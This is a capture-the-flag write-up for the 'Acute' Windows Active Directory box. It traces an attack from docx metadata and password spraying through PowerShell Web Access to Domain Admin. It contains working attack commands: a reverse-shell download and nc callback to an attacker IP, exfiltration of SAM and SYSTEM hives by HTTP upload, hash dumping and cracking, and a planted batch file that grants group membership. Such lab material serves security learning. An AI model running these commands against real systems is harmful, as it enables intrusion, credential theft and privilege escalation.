#Windows #ActiveDirectory #PSWA #RestrictedShell #Exif #docx #credentialhunting #Invoke-Command #Hives #LateralMovement #ScheduledTask #PrivEsc

## Overview

Acute is a hard Windows Active Directory box centered entirely on chaining limited access contexts together without ever having unrestricted PowerShell. The path starts with OSINT from a public-facing website: a downloadable Word document leaks a default password, a username naming scheme, and a hostname. From there, PowerShell Web Access provides a locked-down `dc_manage` session. Credential theft via Meterpreter screenshare, SAM hive dumping, password reuse, and a cron-like batch runner ultimately grant control over `awallace`, who becomes Site Admin and inherits Domain Admin group membership.

## Recon

### HTTPS Website Enumeration

The only open port was 443, serving an IIS site for `atsserver.acute.local`. Directory brute-forcing found nothing. The `/about.html` page listed six staff members:

```
Aileen Wallace, Charlotte Hall, Evan Davies,
Ieuan Monks, Joshua Morgan, Lois Hopkins
```

A downloadable `.docx` file contained two critical pieces of information:

```
Default password for new starters: Password1!

The Staff Induction portal can be found at:
https://atsserver.acute.local/Staff/Induction

PowerShell Web Access: https://atsserver.acute.local/Acute_Staff_Access/...
  → session name: dc_manage
```

Running `exiftool` on the document leaked a hostname and the domain's username format:

```sh
exiftool New_Starter_CheckList_v7.docx
Creator          : FCastle
Computer         : Acute-PC01
Last Modified By : Daniel
```

> **Why metadata matters:** Office documents silently record the creating user's login name and the machine name they saved from. `FCastle` reveals the naming convention (first-initial + last-name), and `Acute-PC01` is a hostname we can target in PSWA.

Building the user list from the staff names and the `FCastle` pattern:

```
awallace  chall  edavies  imonks  jmorgan  lhopkins
```

## Foothold

### PSWA Login as edavies

PowerShell Web Access (PSWA) is a browser-based PS remote console. Spraying the default password against the user list confirmed `edavies:Password1!` on `Acute-PC01` using the `dc_manage` configuration:

```
https://atsserver.acute.local/Acute_Staff_Access/en-US/logon.aspx
  Username: edavies
  Password: Password1!
  Computer: Acute-PC01
  Config:   dc_manage
```

> **What is dc_manage?** A PowerShell session configuration can restrict available cmdlets to a whitelist. `dc_manage` is a constrained endpoint that blocks most cmdlets, preventing direct enumeration. Commands must be sent via `Invoke-Command` rather than interactively.

### Escaping via C:\utils (AV-Free Directory)

Trying to run a standard MSFVenom binary in the PSWA session triggered Defender. Enumerating hidden items in `C:\` revealed a directory the box owners created specifically for bypassing AV:

```powershell
ls -force C:\
# ...
type C:\utils\desktop.ini
[.ShellClassInfo]
InfoTip=Directory for Testing Files without Defender
```

Downloading and running a reverse-shell EXE from this directory succeeded:

```powershell
wget http://10.10.14.158:8000/rev.exe -OutFile rev.exe
.\rev.exe
```

```sh
rlwrap nc -lvnp 443
connect to [10.10.14.158] from (UNKNOWN) [10.129.136.40] 49820
C:\utils> whoami
acute\edavies
```

### Stealing imonks Credentials via Screenshare

WinPEAS revealed an active RDP session for `edavies` running on localhost. Using Meterpreter's screenshare function to observe that session caught a visible PowerShell window where the user was constructing a `PSCredential` object for `imonks` on `ATSSERVER`. The password typed on screen:

```
imonks:w3_4R3_th3_f0rce.
```

## Privilege Escalation

### imonks on ATSSERVER via dc_manage

Direct `Enter-PSSession` to ATSSERVER failed with Access Denied, but the `dc_manage` constrained endpoint was accessible:

```powershell
$pass = ConvertTo-SecureString "w3_4R3_th3_f0rce." -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks", $pass)
Enter-PSSession -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage
```

The session errors because `imonks` lacks `Measure-Object`, but `Invoke-Command` still works for single commands. The allowed cmdlets are: `Get-Alias`, `Get-ChildItem`, `Get-Command`, `Get-Content`, `Get-Location`, `Set-Content`, `Set-Location`, `Write-Output`.

Listing imonks' desktop found a scheduled PS script:

```powershell
Invoke-Command -ScriptBlock { cat ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

```powershell
$securepasswd = '01000000d08c9ddf...'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

### Hijacking wm.ps1 for a Shell as jmorgan

`ConvertTo-SecureString` is not available in the restricted session, so decrypting the blob directly is blocked. Instead, `Set-Content` can overwrite the script. Replacing `Get-Volume` with a reverse shell:

```powershell
Invoke-Command -ScriptBlock {
  ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc64.exe -e cmd 10.10.14.158 53') |
  sc -Path ..\desktop\wm.ps1
} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Running the modified script connected back as `jmorgan`, who is a local administrator on `Acute-PC01`:

```sh
rlwrap nc -lvnp 53
C:\Users\jmorgan\Documents> whoami
acute\jmorgan
```

### Dumping SAM Hives

```powershell
reg save HKLM\sam sam.bak
reg save HKLM\system system.bak
powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.14.158:8080/', 'sam.bak')"
powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.14.158:8080/', 'system.bak')"
```

```sh
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
Natasha:1001:...
```

John cracked the local Administrator hash:

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
‹redacted›     (Administrator)
```

```
administrator:‹redacted›
```

### awallace → Site Admin via keepmeon.bat

Testing the cracked password for credential reuse on ATSSERVER showed it worked for `awallace`:

```powershell
$pass = ConvertTo-SecureString "‹redacted›" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("ACUTE\awallace", $pass)
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami }
acute\awallace
```

With `awallace`, the `keepmeon` directory in Program Files was accessible:

```powershell
Invoke-Command -ScriptBlock { ls '\program files\keepmeon' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
# keepmeon.bat
```

Contents of `keepmeon.bat`:

```bat
REM This is run every 5 minutes. For Lois use ONLY
@echo off
for /R %%x in (*.bat) do (
  if not "%%x" == "%~0" call "%%x"
)
```

> **Why this is the win:** the script loops over every `.bat` file in the directory and executes them, except itself. Anyone who can write a `.bat` file here effectively schedules a command as whoever runs `keepmeon.bat`. The docx mentioned Lois is the only person authorized to modify Site_Admin group membership, and `Site_Admin` provides access to the Domain Admin group.

```powershell
Invoke-Command -ScriptBlock {
  Set-Content -Path '\program files\keepmeon\evil.bat' -Value 'net group site_admin awallace /add /domain'
} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

After waiting for the cron to fire, `awallace` appeared in `Site_Admin`:

```powershell
Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members
awallace
```

## Root

With `awallace` in `Site_Admin`, which grants Domain Admin access, full control of the domain is achieved.

## Takeaways

- **Metadata in documents is actionable recon.** The `.docx` provided the default password, username scheme, hostname, and a named PS session configuration, which is essentially a full attack plan.
- **Constrained PS endpoints are a speed bump, not a wall.** The `dc_manage` whitelist blocked many cmdlets but still allowed `Get-Content` and `Set-Content`, which was enough to inject into a running script.
- **Screensharing an interactive session is a quiet credential-theft technique.** No exploit, no log noise; you just watch the user type their password.
- **Batch-file runners are a privilege escalation vector.** Any "run all `.bat` files in this directory" pattern is effectively a local scheduled task that runs as the account executing the parent script.
